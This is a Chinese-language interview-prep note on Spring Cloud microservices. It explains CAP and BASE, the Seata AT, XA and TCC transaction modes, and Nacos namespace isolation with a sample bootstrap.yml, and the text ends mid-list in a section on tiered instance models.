<p>微服务在面试时被问到的内容相对较少，常见的面试题如下：</p>
<ul>
<li>SpringCloud有哪些常用组件？分别是什么作用？</li>
<li>服务注册发现的基本流程是怎样的？</li>
<li>Eureka和Nacos有哪些区别？</li>
<li>Nacos的分级存储模型是什么意思？</li>
<li>Ribbon和SpringCloudLoadBalancer有什么差异</li>
<li>什么是服务雪崩，常见的解决方案有哪些？</li>
<li>Hystix和Sentinel有什么区别和联系？</li>
<li>限流的常见算法有哪些？</li>
<li>什么是CAP理论和BASE思想？</li>
<li>项目中碰到过分布式事务问题吗？怎么解决的？</li>
<li>AT模式如何解决脏读和脏写问题的？</li>
<li>TCC模式与AT模式对比，有哪些优缺点</li>
</ul>
<h2 id="分布式事务">分布式事务</h2>
<p><strong>分布式事务</strong>，就是指不是在单个服务或单个数据库架构下，产生的事务，例如：</p>
<ul>
<li>跨数据源的分布式事务</li>
<li>跨服务的分布式事务</li>
<li>综合情况</li>
</ul>
<p>我们之前解决分布式事务问题是直接使用Seata框架的AT模式，但是解决分布式事务问题的方案远不止这一种。</p>
<h3 id="CAP定理">CAP定理</h3>
<p>解决分布式事务问题，需要一些分布式系统的基础知识作为理论指导，首先就是CAP定理。</p>
<p>1998年，加州大学的计算机科学家 Eric Brewer 提出，分布式系统有三个指标：</p>
<ul>
<li><strong>C</strong>onsistency（一致性）</li>
<li><strong>A</strong>vailability（可用性）</li>
<li><strong>P</strong>artition tolerance （分区容错性）</li>
</ul>
<p>它们的第一个字母分别是 <code>C</code>、<code>A</code>、<code>P</code>。Eric Brewer认为<strong>任何分布式系统架构方案都不可能同时满足这3个目标</strong>，这个结论就叫做 CAP 定理。</p>
<p>为什么呢？</p>
<h4 id="一致性">一致性</h4>
<p><code>Consistency</code>（一致性）：用户访问分布式系统中的任意节点，得到的数据必须一致。</p>
<p>比如现在包含两个节点，其中的初始数据是一致的：</p>
<p>暂时无法在飞书文档外展示此内容</p>
<p>当我们修改其中一个节点的数据时，两者的数据产生了差异：</p>
<p>暂时无法在飞书文档外展示此内容</p>
<p>要想保住一致性，就必须实现node01 到 node02的数据 同步：</p>
<p>暂时无法在飞书文档外展示此内容</p>
<h4 id="可用性">可用性</h4>
<p>Availability （可用性）：用户访问分布式系统时，读或写操作总能成功。</p>
<p>只能读不能写，或者只能写不能读，或者两者都不能执行，就说明系统弱可用或不可用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDdiOTAxOTM1OWQ2YjFmMjk5MTY0Yjg2Yzg3Y2FkNGVfMHM1WFJwaTB3Ymhjam9PMENjZ254bTN6MlZHM2NXaWVfVG9rZW46WWtiZWJDTzVpb2pCaXl4bDZtN2NpcWNObjJjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h4 id="分区容错性">分区容错性</h4>
<p><code>Partition</code>，就是分区，就是当分布式系统节点之间出现网络故障导致节点之间无法通信的情况：</p>
<p>暂时无法在飞书文档外展示此内容</p>
<p>如上图，node01和node02之间网关畅通，但是与node03之间网络断开。于是node03成为一个独立的网络分区；node01和node02在一个网络分区。</p>
<p><code>Tolerance</code>，就是容错，即便是系统出现网络分区，整个系统也要持续对外提供服务。</p>
<h4 id="矛盾">矛盾</h4>
<p>在分布式系统中，网络不能100%保证畅通，也就是说网络分区的情况一定会存在。而我们的系统必须要持续运行，对外提供服务。所以分区容错性（<code>P</code>）是硬性指标，所有分布式系统都要满足。而在设计分布式系统时要取舍的就是一致性（<code>C</code>）和可用性（<code>A</code>）了。</p>
<p>假如现在出现了网络分区，如图：</p>
<p>暂时无法在飞书文档外展示此内容</p>
<p>由于网络故障，当我们把数据写入node01时，可以与node02完成数据同步，但是无法同步给node03。现在有两种选择：</p>
<ul>
<li>允许用户任意读写，保证可用性。但由于node03无法完成同步，就会出现数据不一致的情况。满足AP</li>
<li>不允许用户写，可以读，直到网络恢复，分区消失。这样就确保了一致性，但牺牲了可用性。满足CP</li>
</ul>
<p>可见，在分布式系统中，<code>A</code>和<code>C</code>之间只能满足一个</p>
<h3 id="BASE理论">BASE理论</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmEzN2RjMzIwMGNhYTBhNTRmMjJmNmNlMTk4Nzg0MGZfYWlzMlpjWmxIUzczRDhVcTNaSWxSMVF5d3JPQVFWWm5fVG9rZW46RFlnSWJIN0R4b1BURFJ4ZXdtUGNwQVpxblljXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>简单来说，BASE理论就是一种取舍的方案，不再追求完美，而是最终达成目标。因此解决分布式事务的思想也是这样，有两个方向：</p>
<ul>
<li>AP思想：各个子事务分别执行和提交，无需锁定数据。允许出现结果不一致，然后采用弥补措施恢复，实现最终一致即可。例如<code>AT</code>模式就是如此</li>
<li>CP思想：各个子事务执行后不要提交，而是等待彼此结果，然后同时提交或回滚。在这个过程中锁定资源，不允许其它人访问，数据处于不可用状态，但能保证一致性。例如<code>XA</code>模式</li>
</ul>
<h4 id="BASE-的三部分解释"><strong>BASE 的三部分解释</strong></h4>
<ol>
<li><strong>基本可用（Basically Available）</strong>
<ol>
<li><strong>含义：</strong> 系统在发生不可预知的错误或部分故障时，仍然保证核心功能的可用性，但允许一定程度的功能损失或延迟。</li>
<li><strong>场景举例：</strong>
<ul>
<li><strong>响应延迟：</strong> 高峰期购物网站支付功能可能比平时慢，但系统仍可正常使用。</li>
<li><strong>功能降级：</strong> 电商网站在高峰期可能关闭部分非核心功能（如商品推荐）。</li>
<li><strong>部分失效：</strong> 某个分区的数据库不可用，但系统其他分区仍能响应用户请求。</li>
</ul>
</li>
</ol>
</li>
<li><strong>软状态（Soft State）</strong>
<ol>
<li><strong>含义：</strong> 系统中状态的存储可以有短暂的不一致，允许数据在节点之间同步的延迟。</li>
<li><strong>特点：</strong> 数据不同步是暂时的，允许系统处于一种不确定的中间状态。</li>
<li><strong>场景举例：</strong>
<ul>
<li>分布式缓存中的数据与数据库的主数据可能短时间不一致（例如缓存延迟更新）。</li>
<li>数据同步系统（如分布式主从库）允许从库比主库有稍许延迟。</li>
</ul>
</li>
</ol>
</li>
<li><strong>最终一致性（Eventually Consistent）</strong>
<ol>
<li><strong>含义：</strong> 系统并不保证强一致性，但通过一定的策略（如定时同步、数据修复等），最终使得所有节点的数据达到一致。</li>
<li><strong>特点：</strong> 一致性可能会有一定的延迟，但数据最终在一个合理时间内达到一致。</li>
<li><strong>场景举例：</strong>
<ul>
<li>DNS 系统中，某个域名的 IP 地址更新后，全球的 DNS 服务器需要一段时间才能完全同步更新。</li>
<li>电商订单系统中，支付状态可能先标记为“处理中”，最终在后台异步确认后变为“已支付”。</li>
</ul>
</li>
</ol>
</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NDNmNmJkZGJmNzUzYjE5NDE4NjFhZDA3NTIyOWYwMWNfOGE2UEZ5aUVScTZLNUREdU05TDk1MDdHZDJzVkhSQWpfVG9rZW46RGpLOGJ0bW5QbzdXSzd4bkFXSmNrV0k3bkpjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="AT模式的脏写问题">AT模式的脏写问题</h3>
<p>AT模式的流程，AT模式也分为两个阶段：</p>
<p>第一阶段是记录数据快照，执行并提交事务：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MWJiMjNhNWZkZjBlNGVkNDM2NDlkNGNmNzU1MTAzYTdfeDFWRkNaQjZ6MmFOYlpUZG9SWkhOcGlMNXVVNHNnWm5fVG9rZW46VmZMR2I1emxtb25tWWl4YmVFTWNCekd2bnZRXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>第二阶段根据阶段一的结果来判断：</p>
<ul>
<li>如果每一个分支事务都成功，则事务已经结束（因为阶段一已经提交），因此删除阶段一的快照即可</li>
<li>如果有任意分支事务失败，则需要根据快照恢复到更新前数据。然后删除快照</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWQxMGQzNjY4Y2I2NTE1OWMxZTRkNjRlOGQ4OWIyZjhfUjlXNWphU3puVVlpeGh3RXdyYUk2UG1tYWhBeVpCbWFfVG9rZW46S1ZjN2J3RkFVb2lSSjV4QzBHZ2NNa3pXblRlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>这种模式在大多数情况下（99%）并不会有什么问题，不过在极端情况下，特别是多线程并发访问AT模式的分布式事务时，有可能出现脏写问题，如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NGQwN2I0MjRiMGFmOTQ4ZmY4NjE1ZTM1NzM1OTkxMmJfTjZVZ0sxWTBBTlpzdHVMTEUzNG1ya09ibWNPMGhUOG9fVG9rZW46WGFvM2JTSFg2b2dnNVp4YnRnNmNTNU1QbnpSXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>解决思路就是引入了全局锁的概念。在释放DB锁之前，先拿到全局锁。避免同一时刻有另外一个事务来操作当前数据。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjZiMzg1YmVlNTczZDM5OWI0ZDQ1YjM4ZTEzYTYwZDBfOEFuQkpEYUhVaVFtRkxvbzRpS3VVR1d6YmFEU2hmVXdfVG9rZW46QkFpTGJsa1U0b3c0RGt4QVhmeGNSOVJNbjNjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OGEwOTgzYTU0MDhlMzBkZTJiY2I4YTNhMDJlNTA3MTRfVkhUNk1oNjF5MFZoc3hydmdEOThxUmlpMXoxNDIwZlNfVG9rZW46VE41cGJqWVZVb043UnB4UlZPdWNLVnV2bkNoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OGIwYmU0ZGJlOGU1M2RhZWM4NzAxMTg4YzUyNzUwZDNfektJc0NLbVFpTFJ1U3dxSHpTc3ZyNlpjV2p5WEZOR2VfVG9rZW46RUdJOWJDQ1Izb1kzUFF4MVd6T2NQZFJubkRiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h4 id="XA模式">XA模式</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTRkZTg5ZmZlMjg4OGRkZDEyZTk5NjBjYzg1YmVhMDFfT0l0MUNDRXdTd3ZEOFdGZnVJeUxtY2RReVRWRlM3R2xfVG9rZW46UlNwRGJDZWprb252U0J4Rm0zaGNqVVFGbkRoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MDVjNjlhZGU2OWYxODk1NTEwZTg1NzZiOWU3ZTYyYTNfQ2I2OFdXSE5xMXN3OWZRMWpublh4ZU9ZYUNTWWRkS1BfVG9rZW46RlRMa2I5ZmJJb0JpNE54Z3ZJdWM2MGNVbkRoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzUwZjVmZmRhNzFkMmM3NmUwMTk3ODkxNzFmNTcwYzNfMU95MkRCcjh5akFqR3ZQQ2ZsbVBCT0xYdlFxdE5ORzFfVG9rZW46RjM2TGJJWm5ab1FnUFN4U21BZ2MwQnBWbjVjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="TCC模式">TCC模式</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MWE5ZGM4YTlmYTk3NzEyMDIzYmM2MGQ5NDcwYWNmYzNfR28xTkFBeWZhUUNrUGNqbDA5OEFhUmpxSWpFNjBya1lfVG9rZW46SlhlQWJyTHM4b2FNb0d4SzNLUWNSd1J2bkhjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>TCC模式与AT模式非常相似，每阶段都是独立事务，不同的是TCC通过人工编码来实现数据恢复。需要实现三个方法：</p>
<ul>
<li><code>try</code>：资源的检测和预留；</li>
<li><code>confirm</code>：完成资源操作业务；要求 <code>try</code> 成功 <code>confirm</code> 一定要能成功。</li>
<li><code>cancel</code>：预留资源释放，可以理解为try的反向操作。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTJlZDdhODRkNmE1ZDg3OGU4NDJhZjkwYjIzMDNkNzNfTXpQa1NGcnkxSDZwTHM1VnhFcEx6YnVTY1JvNnNoUHpfVG9rZW46TkFEeWJKN2RSb2NqQ1N4UGZaMGNPazdJbmhjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><strong>阶段一（ Try ）</strong>：检查余额是否充足，如果充足则冻结金额增加30元，可用余额扣除30</p>
<p>初始余额：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MzQ0ZWI0YTQ1YzZjNDE1NjMxMTU2ODdiZTEyYzEwNmVfYURBZGFzb3l2VHhsQ3FQTjdLR0VPUWVhVUd6QUNjSUJfVG9rZW46VUJZYWJxSGR6b0NCSnV4WWZLTWMxRmQ2bktiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>余额充足，可以冻结：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=MjRhODBmMDRlY2NiOTU0ODY3MzJhODMzNGIxNzA0YWJfZTVCN3BDSXdXOFBXd0YxUTU4ZUN0eXpja0F0MVliNlVfVG9rZW46S1RyeWJ4VFBnb0RQaHh4UDV0dGNUNTN4blJXXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>此时，总金额 = 冻结金额 + 可用金额，数量依然是100不变。事务直接提交无需等待其它事务。</p>
<p><strong>阶段二（Confirm)</strong>：假如要提交（Confirm），之前可用金额已经扣减，并转移到冻结金额。因此可用金额不变，直接冻结金额扣减30即可：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ODQxYjMwOTE2MzY3ZjhlZDc0MzFjMWI4ODJkM2I2MjZfbHdLZEliT0NEbTlEMWYyVlJKQjVIaG80WWlrdWh6ck5fVG9rZW46T2JxWGJ6MjFab1RHUFl4alR1b2M3VHVBbkJnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>此时，总金额 = 冻结金额 + 可用金额 = 0 + 70  = 70元</p>
<p><strong>阶段二(Canncel)</strong>：如果要回滚（Cancel），则释放之前冻结的金额，也就是冻结金额扣减30，可用余额增加30</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=M2UzZTMxNzBkZWM5ZmVhZTZhMTA0OGFjODhjNGZjMTdfbmNuaFpIRDFwQkRXdk1IMXpUT1M0OGx0NVp3Tk1tRDhfVG9rZW46VkpLSmJpUzhUb0tKbUV4S0RFRGNwTHpHbllnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTg2MTNmYjA5Yzc4ZTM1NDI0ZGQyNDI3YjFmNDc5ZTNfMjJ1NGc2MFJ3cG9VYXoxbTJVMmVaR0czZHRqNXdnYVNfVG9rZW46TG5wc2JmYWlwb0lGWXl4UTZYcWNneHBwbjJiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YWJmMjBlZTJiN2I5YmViYzk1NTdmNTdhNTM4MDZkYjBfZGkzMXFmRjhEQ1BxT09iYVUxaVNpZktwaGpJUHpEZ2pfVG9rZW46TzlrVmJjR1lWb0VEUGl4MGI4MmN3RmhpbklmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="最大努力通知">最大努力通知</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjIwZjk5ODZiZjU1NDBhODJhMDVjZTllODBlMWE2NjdfRUJFcW9pYkN6U1lUMFlqTkwwVXFJNEJLbHBFTkV3QjNfVG9rZW46RjBQQ2JwbnEyb2dqVEJ4RnowV2N6U0JEbjdnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="注册中心">注册中心</h2>
<h3 id="环境隔离">环境隔离</h3>
<p>企业实际开发中，往往会搭建多个运行环境，例如：</p>
<ul>
<li>开发环境</li>
<li>测试环境</li>
<li>预发布环境</li>
<li>生产环境</li>
</ul>
<p>这些不同环境之间的服务和数据之间需要隔离。</p>
<p>还有的企业中，会开发多个项目，共享nacos集群。此时，这些项目之间也需要把服务和数据隔离。</p>
<p>因此，Nacos提供了基于<code>namespace</code>的环境隔离功能。具体的隔离层次如图所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDQyNDEwMWM1MzIzNzMxNDJiOThmZGNiNDE4ZGMzYjNfTGZFM3JUVVY5ODNqMGdsZ0loN2VBYmVVb3BqaGpkMmFfVG9rZW46THNVemJYQlpTbzQyd254ME9ZTWNzOWpkbm5iXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>说明：</p>
<ul>
<li>Nacos中可以配置多个<code>namespace</code>，相互之间完全隔离。默认的<code>namespace</code>名为<code>public</code></li>
<li><code>namespace</code>下还可以继续分组，也就是group ，相互隔离。 默认的group是<code>DEFAULT_GROUP</code></li>
<li><code>group</code>之下就是服务和配置了</li>
</ul>
<h4 id="创建namespace">创建namespace</h4>
<p>nacos提供了一个默认的<code>namespace</code>，叫做<code>public</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OWE5YzJkYjZiNTViZmM4MzM4MTFkYTUzNjZmMjYxNzFfRURPQ3ZOM2V5a1BxUHNzRlFoWHowY0ZyWlJoZWlqSkpfVG9rZW46UmJZV2IyUU5tb3ljemJ4Z3dFRmMxR25kbkxkXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>默认所有的服务和配置都属于这个<code>namespace</code>，当然我们也可以自己创建新的<code>namespace</code>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTg3M2NjYWIxNzVlOTZlZTYyZDBkZjJkODJmZmE2NzNfMDFyR1A0RVZPZ1RpZXM2eFFIdGRyU0ZpOUEwcUlROUhfVG9rZW46RDFjeWJWaUNzbzRSRnl4TTBmNGMyVnJnbmhiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>然后填写表单：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjE2ZGRhNjM2MjM0NWZmNmE5Mzg0YmYzZjJmOWU1NGZfSUpENFFZeFB3U3F3NDZOajdqYnBKTlQ1RWtrZVRqSGRfVG9rZW46RDdNSmIwSnptb3BaQWR4Q2hYQ2NnZnR4bm9lXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>添加完成后，可以在页面看到我们新建的<code>namespace</code>，并且Nacos为我们自动生成了一个命名空间id：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=OTA4NTRmNjBkZGJjMjQzZThlYjU4ODZjYjQ1M2E4ODRfQTdhcjJaUldaMnMzWk1WWmlzd2ZMMElaUkozRWFuNnBfVG9rZW46T0FrU2JvM0I4b3l2NXJ4a09TZ2NxQ25tbnpoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>我们切换到配置列表页，你会发现<code>dev</code>这个命名空间下没有任何配置：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YzliYzhjMjkwNjBlOWJmZmQ1MzE2ZGEyMDYzZjBiY2JfaFhSb3R5YlhvTkFVZEllQkYwMHhUaEpmRkNLMURuN05fVG9rZW46QXV4QmJnUHdib09wYlB4SUxueGN1ZlZtblFoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>因为之前我们添加的所有配置都在<code>public</code>下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjc0YzFhYjI4OTUwOGYwODM4OWIwNzQ0YWNlMWVkNTlfV2FTWVF0ZGdLYkdLNk5abmpuUEJ2blZlbEdLaTk5bVpfVG9rZW46SENRQ2JiaW9Rb0kwbUZ4d3RQeWNIV0gxbkFiXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h4 id="微服务配置namespace">微服务配置namespace</h4>
<p>默认情况下，所有的微服务注册发现、配置管理都是走<code>public</code>这个命名空间。如果要指定命名空间则需要修改<code>application.yml</code>文件。</p>
<p>比如，我们修改<code>item-service</code>服务的bootstrap.yml文件，添加服务发现配置，指定其<code>namespace</code>：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">item-service</span> <span class="comment"># 服务名称</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">server-addr:</span> <span class="number">192.168</span><span class="number">.150</span><span class="number">.101</span> <span class="comment"># nacos地址</span></span><br><span class="line">      <span class="attr">discovery:</span> <span class="comment"># 服务发现配置</span></span><br><span class="line">        <span class="attr">namespace:</span> <span class="string">8c468c63-b650-48da-a632-311c75e6d235</span> <span class="comment"># 设置namespace，必须用id</span></span><br><span class="line">      <span class="comment"># 。。。略</span></span><br></pre></td></tr></table></figure>
<p>启动<code>item-service</code>，查看服务列表，会发现<code>item-service</code>出现在<code>dev</code>下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDQxZTk0NDJhYTRmNzA4YjU2ZmQ2ODA4Y2NmMzE0ZDdfa0tZaDhSR0piazc2a1d6ak94SUJITHQxQVVKeUdhVUpfVG9rZW46SzBJbGJ6eVJEb3hJcW14SG9iS2MyM2N3bnVjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>而其它服务则出现在<code>public</code>下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjM2MGVkNWMxNWIyN2QwMTdiNGVlNGNlZTgzMWU5YmRfeFZpRnVwczlwTkVnM2V3ZlJmQ0NXTHRna1UxMWFxZjNfVG9rZW46WGNBZmJHd3o3b0JTSll4anhwSmNuVEtCbkhvXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>此时访问<code>http://localhost:8082/doc.html</code>，基于<code>swagger</code>做测试：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YjJiZmQzNGQ5YWQ3NWZlMmZiNjgzYzAxYWVmN2ViZDZfdHFPMG5vRkh6cUptem5OdldaTnpZNWZyYXNuendidGtfVG9rZW46SWdJZ2J5U0Ywb01GWVF4OHM0NmN3bDlabkdoXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>会发现查询结果中缺少商品的最新价格信息。</p>
<p>我们查看服务运行日志：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2ZmODFhNzk2ZGRlZTBhYjgyNzUxZTVmNTA0MmJiZWZfemdGd29nV0FackhNclprRXY2SUVSc1c5WUlHODVrT3NfVG9rZW46R2hWRmIwVnhCb0FxcTJ4djZnM2NIbEl5bkxlXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p>会发现<code>cart-service</code>服务在远程调用<code>item-service</code>时，并没有找到可用的实例。这证明不同namespace之间确实是相互隔离的，不可访问。</p>
<p>当我们把<code>namespace</code>切换回<code>public</code>，或者统一都是以<code>dev</code>时访问恢复正常。</p>
<h3 id="分级模型">分级模型</h3>
<p>在一些大型应用中，同一个服务可以部署很多实例。而这些实例可能分布在全国各地的不同机房。由于存在地域差异，网络传输的速度会有很大不同，因此在做服务治理时需要区分不同机房的实例。</p>
<p>例如item-service，我们可以部署3个实例：</p>
<ul>
<li>127.0.0.1:8081</li>
